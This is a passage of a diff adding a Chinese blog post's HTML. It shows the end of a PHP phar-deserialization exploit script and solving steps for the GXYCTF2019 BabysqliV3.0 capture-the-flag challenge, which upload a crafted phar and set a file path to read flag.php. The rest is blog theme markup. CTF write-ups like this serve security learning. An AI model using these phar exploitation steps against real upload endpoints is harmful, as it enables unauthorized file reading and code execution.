invoke__">setMetadata</span>(<span class="variable">$p</span>);   <span class="comment">#传入触发对象</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;phar.txt&quot;</span>,<span class="string">&quot;phar&quot;</span>);   <span class="comment">#随便写点，生成签名</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h4><p>随便上传一个文件，点击两次’上传’，得到<code>token</code>。</p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505102040522.png" alt="image-20240927195911158"></p>
+<p>然后运行<code>exp.php</code>，生成<code>exp.phar</code>文件，上传<code>exp.phar</code>，这里只点击一次’上传’即可。</p>
+<p>再随便上传一个文件，<code>Burp</code>抓包，添加参数<code>name=/var/www/html/flag.php</code>后，发送即可获得<code>flag</code>。</p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505102040120.png" alt="image-20240927200749703"></p>
+<p>唉，这道题写一天了，也没真正搞清楚，只能先放这儿了。</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag"># web安全</a>
+              <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag"># 反序列化</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2024/11/20/%E4%B8%80%E9%81%93%E9%A2%98%E8%AE%A4%E8%AF%86%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="prev" title="有关反序列化的两道题">
+      <i class="fa fa-chevron-left"></i> 有关反序列化的两道题
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2024/12/18/jinja2%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/" rel="next" title="jinja2模板注入总结">
+      jinja2模板注入总结 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+      <!-- require APlayer -->
+      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css">
+      <script src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script>
+      <!-- require MetingJS-->
+      <script src="https://cdn.jsdelivr.net/npm/meting@2.0.1/dist/Meting.min.js"></script>
+      <meting-js
+        auto="https://y.qq.com/n/yqq/playlist/9454682797.html#stat=y_new.playlist.pic_click">
+      </meting-js>
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E6%8F%90%E7%9F%A5%E8%AF%86"><span class="nav-number">1.</span> <span class="nav-text">前提知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#phar%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84"><span class="nav-number">1.1.</span> <span class="nav-text">phar文件结构</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%89%8D%E6%8F%90%E6%9D%A1%E4%BB%B6"><span class="nav-number">1.2.</span> <span class="nav-text">利用前提条件</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ctf%E5%AE%9E%E6%88%98%E7%BB%83%E4%B9%A0"><span class="nav-number">2.</span> <span class="nav-text">ctf实战练习</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox"><span class="nav-number">2.1.</span> <span class="nav-text">1.[CISCN2019 华北赛区 Day1 Web1]Dropbox</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-SWPUCTF-2018-SimplePHP"><span class="nav-number">2.2.</span> <span class="nav-text">2.[SWPUCTF 2018]SimplePHP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-GXYCTF2019-BabysqliV3-0"><span class="nav-number">2.3.</span> <span class="nav-text">3.[GXYCTF2019]BabysqliV3.0</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%86%E6%9E%90upload-php%E6%BA%90%E7%A0%81"><span class="nav-number">2.3.1.</span> <span class="nav-text">分析upload.php源码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="nav-number">2.3.2.</span> <span class="nav-text">phar反序列化利用思路</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B"><span class="nav-number">2.3.3.</span> <span class="nav-text">解题过程</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Qwen"
+      src="/images/avatar_2.jpg">
+  <p class="site-author-name" itemprop="name">Qwen</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">58</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Qwen</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+
+
+
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
